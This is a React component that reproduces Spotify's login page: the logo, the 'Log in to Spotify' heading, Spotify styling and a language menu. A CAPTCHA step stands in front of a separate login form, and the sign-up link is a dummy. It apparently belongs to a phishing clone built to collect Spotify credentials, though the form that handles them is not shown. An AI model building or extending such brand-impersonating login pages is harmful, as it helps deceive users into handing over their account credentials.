import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import LoginForm from './LoginForm';
import { useLanguage } from '../hooks/useLanguage';
import CaptchaVerification from './CaptchaVerification';
import './HomePage.css';

function HomePage() {
  const navigate = useNavigate();
  const { t, language, toggleLanguage } = useLanguage();
  const [showCaptcha, setShowCaptcha] = useState(true);
  const [showLogin, setShowLogin] = useState(false);

  // Safe fallback translations
  const safeT = {
    loginToSpotify: "Log in to Spotify",
    noAccount: "Don't have an account? ",
    signUp: "Sign up for Spotify",
    signupUnavailable: "Sign up is currently unavailable.",
    ...t
  };

  const handleSignUp = (e) => {
    e.preventDefault();
    const msg = document.createElement('div');
    msg.style.cssText = 'position:fixed;top:20px;left:50%;transform:translateX(-50%);background:#1ed760;color:#000;padding:12px 24px;border-radius:500px;font-weight:600;z-index:9999;font-family:Arial';
    msg.textContent = safeT.signupUnavailable;
    document.body.appendChild(msg);
    setTimeout(() => msg.remove(), 3000);
  };

  const handleCaptchaSuccess = () => {
    setShowCaptcha(false);
    setShowLogin(true);
  };

  return (
    <div className="spotify-page">
      <div className="spotify-container">
        {/* Logo */}
        <div className="spotify-logo">
          <svg viewBox="0 0 24 24" width="40" height="40" fill="white">
            <path d="M12 0C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.66 0 12 0zm5.521 17.34c-.24.359-.66.48-1.021.24-2.82-1.74-6.36-2.101-10.561-1.141-.418.122-.779-.179-.899-.539-.12-.421.18-.78.54-.9 4.56-1.021 8.52-.6 11.64 1.32.42.18.479.659.301 1.02zm1.44-3.3c-.301.42-.841.6-1.262.3-3.239-1.98-8.159-2.58-11.939-1.38-.479.12-1.02-.12-1.14-.6-.12-.48.12-1.021.6-1.141C9.6 9.9 15 10.561 18.72 12.84c.361.181.54.78.241 1.2zm.12-3.36C15.24 8.4 8.82 8.16 5.16 9.301c-.6.179-1.2-.181-1.38-.721-.18-.601.18-1.2.72-1.381 4.26-1.26 11.28-1.02 15.721 1.621.539.3.719 1.02.419 1.56-.299.421-1.02.599-1.559.3z"/>
          </svg>
          <span className="spotify-logo-text">Spotify</span>
        </div>

        {/* Title */}
        <h1 className="spotify-title">{safeT.loginToSpotify}</h1>

        {/* CAPTCHA or Login Form */}
        {showCaptcha && !showLogin && (
          <CaptchaVerification onSuccess={handleCaptchaSuccess} />
        )}
        
        {showLogin && <LoginForm />}

        {/* Sign up link - Only show after CAPTCHA is passed */}
        {showLogin && (
          <div className="spotify-signup">
            <span>{safeT.noAccount}</span>
            <a href="#signup" onClick={handleSignUp}>{safeT.signUp}</a>
          </div>
        )}

        {/* Language Switcher - Simple Select with Flags */}
        <div className="language-select-container">
          <select 
            value={language} 
            onChange={(e) => toggleLanguage(e.target.value)}
            className="language-select"
          >
            <option value="en">🌐 English (EN)</option>
            <option value="cz">🌐 Czech (CZ)</option>
            <option value="de">🌐 German (DE)</option>
            <option value="fr">🌐 French (FR)</option>
            <option value="es">🌐 Spanish (ES)</option>
            <option value="da">🌐 Danois (DA)</option>
          </select>
        </div>
      </div>
    </div>
  );
}

export default HomePage;